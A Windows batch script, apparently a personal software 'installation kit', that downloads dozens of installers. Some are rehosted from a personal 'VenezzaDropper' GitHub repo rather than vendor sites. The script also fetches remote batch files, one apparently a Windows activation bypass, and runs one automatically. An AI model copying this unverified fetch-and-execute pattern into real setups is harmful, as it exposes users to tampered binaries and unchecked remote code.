@echo off
chcp 65001 >nul
mode con: cols=250 lines=60
echo.
echo " /^^         /^^/^^^^^^^^/^^^     /^^/^^^^^^^^/^^^^^^^ /^^/^^^^^^^ /^^      /^  "       
echo " /^^       /^^ /^^      /^ /^^   /^^/^^             /^^         /^^       /^ ^^ "     
echo " /^^     /^^  /^^      /^^ /^^  /^^/^^            /^^         /^^       /^  /^^ "    
echo " /^^   /^^   /^^^^^^  /^^  /^^ /^^/^^^^^^      /^^         /^^        /^^   /^^ "   
echo " /^^ /^^    /^^      /^^   /^ /^^/^^         /^^         /^^        /^^^^^^ /^^ "  
echo " /^^^^     /^^      /^^    /^ ^^/^^       /^^         /^^         /^^       /^^ "
echo " /^^      /^^^^^^^^/^^      /^^/^^^^^^^^/^^^^^^^^^^^/^^^^^^^^^^^/^^         /^^ "                                                                                    
echo.

@echo off
setlocal enabledelayedexpansion
color 0A

:: Download directory
set "INSTALL_DIR=%USERPROFILE%\Desktop\INSTALLATION KIT"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

:: Create main Downloads folder and subfolders
set "DOWNLOADS_DIR=%INSTALL_DIR%\Downloads"
if not exist "%DOWNLOADS_DIR%" mkdir "%DOWNLOADS_DIR%"

:: Create category folders inside Downloads
mkdir "%DOWNLOADS_DIR%\Browsers" 2>nul
mkdir "%DOWNLOADS_DIR%\Game Launchers" 2>nul
mkdir "%DOWNLOADS_DIR%\Game Utilities" 2>nul
mkdir "%DOWNLOADS_DIR%\Media" 2>nul
mkdir "%DOWNLOADS_DIR%\Development" 2>nul
mkdir "%DOWNLOADS_DIR%\Minecraft Clients" 2>nul
mkdir "%DOWNLOADS_DIR%\Communication" 2>nul
mkdir "%DOWNLOADS_DIR%\System Tools" 2>nul
mkdir "%DOWNLOADS_DIR%\Compression" 2>nul
mkdir "%DOWNLOADS_DIR%\Desktop Customization" 2>nul
mkdir "%DOWNLOADS_DIR%\Utilities" 2>nul
mkdir "%DOWNLOADS_DIR%\ClippingTools" 2>nul

:: LIST
set "FAILED=0"
set "INSTALLED=0"
set "ERROR=0"
set "FAILED_LIST="
set "INSTALLED_LIST="
set "ERROR_LIST="

:: INSTALLERS

:: ROBLOX BLOXSTRAP
call :DownloadInstaller "Bloxstrap-v2.8.6.exe" "https://github.com/bloxstraplabs/bloxstrap/releases/download/v2.8.6/Bloxstrap-v2.8.6.exe" "Game Utilities"

:: BRAVE E OPERAGX
call :DownloadInstaller "BraveInstaller.exe" "https://laptop-updates.brave.com/latest/win64" "Browsers"
call :DownloadInstaller "OperaGX.exe" "https://net.geo.opera.com/opera_gx/stable/windows" "Browsers"

:: Steam e EPIC
call :DownloadInstaller "SteamSetup.exe" "https://cdn.akamai.steamstatic.com/client/installer/SteamSetup.exe" "Game Launchers"
call :DownloadInstaller "EpicInstaller.msi" "https://launcher-public-service-prod06.ol.epicgames.com/launcher/api/installer/download/EpicGamesLauncherInstaller.msi" "Game Launchers"

:: SPOTIFY
call :DownloadInstaller "SpotifySetup.exe" "https://download.scdn.co/SpotifySetup.exe" "Media"

:: AFTERBURNER
call :DownloadInstaller "MSIAfterburner.zip" "https://download.msi.com/uti_exe/vga/MSIAfterburnerInstaller466Beta5.zip?__token__=exp=" "Game Utilities"

:: VISUAL STUDIO
call :DownloadInstaller "VSCode.exe" "https://code.visualstudio.com/sha/download?build=stable&os=win32-x64-user" "Development"
call :DownloadInstaller "VSCommunity.exe" "https://aka.ms/vs/17/release/vs_community.exe" "Development"

:: NOTEPAD PLUS PLUS
call :DownloadInstaller "NotepadPlus.exe" "https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/npp.8.7.8.Installer.x64.exe" "Development"

:: VOICE CHANGER
call :DownloadInstaller "Voicemod.exe" "https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/VoicemodInstaller_1.3.3-niwcta.exe" "Communication"

:: AUTO HOTKEY MACROING
call :DownloadInstaller "ahk-install.exe" "https://www.autohotkey.com/download/ahk-install.exe" "Utilities"

:: MINECRAFT CLIENTS
call :DownloadInstaller "Lunar-Client-Installer.exe" "https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/Lunar-Client-Installer.exe" "Minecraft Clients"
call :DownloadInstaller "Badlion-Client.exe" "https://www.badlion.net/download/client/latest/windows-backup" "Minecraft Clients"
call :DownloadInstaller "Modrinth_App_0.9.3_x64-setup.exe" "https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/Modrinth_App_0.9.3_x64-setup.exe" "Minecraft Clients"
call :DownloadInstaller "CurseForge-Installer.exe" "https://github.com/VenezzaX/VenezzaDropper/raw/refs/heads/main/CurseForge-Installer.exe" "Minecraft Clients"
call :DownloadInstaller "MinecraftInstaller.exe" "https://launcher.mojang.com/download/MinecraftInstaller.exe?ref=mcnet" "Minecraft Clients"

:: MOBILE SCREEN MIRROR
call :DownloadInstaller "scrcpy-win64.zip" "https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/scrcpy-win64-v3.1.zip" "Utilities"

:: GITHUB DESKTOP
call :DownloadInstaller "GitHubDesktopSetup-x64.exe" "https://desktop.githubusercontent.com/releases/3.4.18-19c76e1d/GitHubDesktopSetup-x64.exe" "Development"

:: MEDAL e GEFORCE NOW
call :DownloadInstaller "MedalSetup.exe" "https://cdn.medal.tv/production/candidate/electron/win32/4.2673.0/MedalSetup.exe" "ClippingTools"
call :DownloadInstaller "NVIDIA_app_beta_v11.0.3.213.exe" "https://us.download.nvidia.com/nvapp/client/11.0.3.213/NVIDIA_app_beta_v11.0.3.213.exe" "Game Launchers"

:: DISCORD e ZAP
call :DownloadInstaller "DiscordSetup.exe" "https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64" "Communication"
call :DownloadInstaller "WhatsApp-Installer.exe" "https://get.microsoft.com/installer/download/9NKSQGP7F2NH" "Communication"

:: CPU-Z
call :DownloadInstaller "cpu-z_2.15-en.exe" "https://download.cpuid.com/cpu-z/cpu-z_2.15-en.exe" "System Tools"

:: LOGITECH
call :DownloadInstaller "lghub_installer.exe" "https://download01.logi.com/web/ftp/pub/techsupport/gaming/lghub_installer.exe" "Game Utilities"

:: JAVA
call :DownloadInstaller "jre-8u441-windows-x64.exe" "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251656_7ed26d28139143f38c58992680c214a5" "Development"

:: VIDEO
call :DownloadInstaller "vlc-3.0.21-win64.exe" "https://get.videolan.org/vlc/3.0.21/win64/vlc-3.0.21-win64.exe" "Media"
call :DownloadInstaller "audacity-win-3.7.3-64bit.exe" "https://github.com/audacity/audacity/releases/download/Audacity-3.7.3/audacity-win-3.7.3-64bit.exe" "Media"
call :DownloadInstaller "OBS-Studio-31.0.3-Windows-Installer.exe" "https://github.com/obsproject/obs-studio/releases/download/31.0.3/OBS-Studio-31.0.3-Windows-Installer.exe" "Media"

:: 7zip and WINRAR
call :DownloadInstaller "winrar-x64-710br.exe" "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-710br.exe" "Compression"
call :DownloadInstaller "7z2409-x64.exe" "https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/7z2409-x64.exe" "Compression"

:: PAINTNET
call :DownloadInstaller "paint.net.5.1.6.portable.x64.zip" "https://github.com/VenezzaX/VenezzaDropper/raw/refs/heads/main/paint.net.5.1.6.install.anycpu.web.zip" "Utilities"

:: EXPLORERS
call :DownloadInstaller "Autoruns.zip" "https://download.sysinternals.com/files/Autoruns.zip" "System Tools"
call :DownloadInstaller "ProcessMonitor.zip" "https://download.sysinternals.com/files/ProcessMonitor.zip" "System Tools"
call :DownloadInstaller "ProcessExplorer.zip" "https://download.sysinternals.com/files/ProcessExplorer.zip" "System Tools"
call :DownloadInstaller "Wireshark-4.4.5-x64.exe" "https://2.na.dl.wireshark.org/win64/Wireshark-4.4.5-x64.exe" "System Tools"
call :DownloadInstaller "portmaster-installer.exe" "https://updates.safing.io/latest/windows_amd64/packages/portmaster-installer.exe" "System Tools"
call :DownloadInstaller "ipscan-3.9.1-setup.exe" "https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan-3.9.1-setup.exe" "System Tools"
call :DownloadInstaller "parsec-windows.exe" "https://builds.parsec.app/package/parsec-windows.exe" "System Tools"

:: DESKTOP CUSTOMIZATION
call :DownloadInstaller "TranslucentTB-portable-x64.zip" "https://github.com/TranslucentTB/TranslucentTB/releases/download/2024.4/TranslucentTB-portable-x64.zip" "Desktop Customization"
call :DownloadInstaller "Rainmeter-4.5.21.exe" "https://github.com/rainmeter/rainmeter/releases/download/v4.5.21.3816/Rainmeter-4.5.21.exe" "Desktop Customization"

:: WEBCAM
call :DownloadInstaller "IriunWebcam-2.8.10.exe" "https://1758658189.rsc.cdn77.org/IriunWebcam-2.8.10.exe" "Communication"

:: Misc Utilities
call :DownloadInstaller "GPU-Z.exe" "https://www.techpowerup.com/download/techpowerup-gpu-z/" "System Tools"
call :DownloadInstaller "HWMonitor.exe" "https://download.cpuid.com/hwmonitor/hwmonitor_1.52.exe" "System Tools"
call :DownloadInstaller "ShutUp10.exe" "https://www.oo-software.com/download/current/ooshutup10" "System Tools"
call :DownloadInstaller "Rufus.exe" "https://github.com/pbatard/rufus/releases/download/v4.5/rufus-4.5.exe" "Utilities"
call :DownloadInstaller "PowerToysSetup.exe" "https://github.com/microsoft/PowerToys/releases/download/v0.81.0/PowerToysSetup-0.81.0-x64.exe" "Utilities"

:: RECENTLY ADDED
call :DownloadInstaller "ventoy-1.1.05-windows.zip" "https://github.com/ventoy/Ventoy/releases/download/v1.1.05/ventoy-1.1.05-windows.zip" "Utilities"


:: LOGS
echo [%FAILED%] FAILED: %FAILED_LIST% > "%INSTALL_DIR%\install_log.txt"
echo [%INSTALLED%] INSTALLED: %INSTALLED_LIST% >> "%INSTALL_DIR%\install_log.txt"
echo [%ERROR%] ERROR: %ERROR_LIST% >> "%INSTALL_DIR%\install_log.txt"

goto CreateShortcuts

:DownloadInstaller
set "FILENAME=%~1"
set "URL=%~2"
set "FOLDER=%~3"

echo Downloading %FILENAME%...
curl -Lo "%DOWNLOADS_DIR%\%FOLDER%\%FILENAME%" "%URL%" --silent --show-error --fail
if errorlevel 1 (
    echo %FILENAME% failed to download.
    set /a FAILED+=1
    set /a ERROR+=1
    set "FAILED_LIST=!FAILED_LIST! %FILENAME%"
    set "ERROR_LIST=!ERROR_LIST! %FILENAME%"
) else (
    echo %FILENAME% downloaded successfully to Downloads\%FOLDER% folder.
    set /a INSTALLED+=1
    set "INSTALLED_LIST=!INSTALLED_LIST! %FILENAME%"
)

exit /b

:CreateShortcuts
setlocal

:: PATH
set "DESKTOP=%USERPROFILE%\Desktop"
set "TARGET_FOLDER=%DESKTOP%\INSTALLATION KIT"
set "MISC_FOLDER=%TARGET_FOLDER%\Misc"

:: FOLDERS
if not exist "%TARGET_FOLDER%" mkdir "%TARGET_FOLDER%"
if not exist "%MISC_FOLDER%" mkdir "%MISC_FOLDER%"

:: POWERSHELLS
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/VenezzaX/VenezzaDropper/raw/refs/heads/main/wallpfp.bmp', '%MISC_FOLDER%\wallpfp.bmp')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/owo.bat', '%MISC_FOLDER%\owo.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/Venezza.html', '%TARGET_FOLDER%\Venezza.html')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/Apps-Info.txt', '%TARGET_FOLDER%\Apps-Info.txt')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/refs/heads/main/LETMETWEAKMYWINDOWSTHEWAYIWANT.bat', '%MISC_FOLDER%\LETMETWEAKMYWINDOWSTHEWAYIWANT.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/VenezzaX/VenezzaDropper/main/MASSGRAVELPLEASEACTIVATEMYWIN.bat', '%MISC_FOLDER%\MASSGRAVELPLEASEACTIVATEMYWIN.bat')"

echo Files downloaded successfully to: %TARGET_FOLDER%

:: WALLPAPER
call "%MISC_FOLDER%\owo.bat"
call "%MISC_FOLDER%\Venezza.html"

echo All installers processed. Check the log file at "%INSTALL_DIR%\install_log.txt".
echo All downloads are organized in the "Downloads" folder within "%INSTALL_DIR%".

exit

pause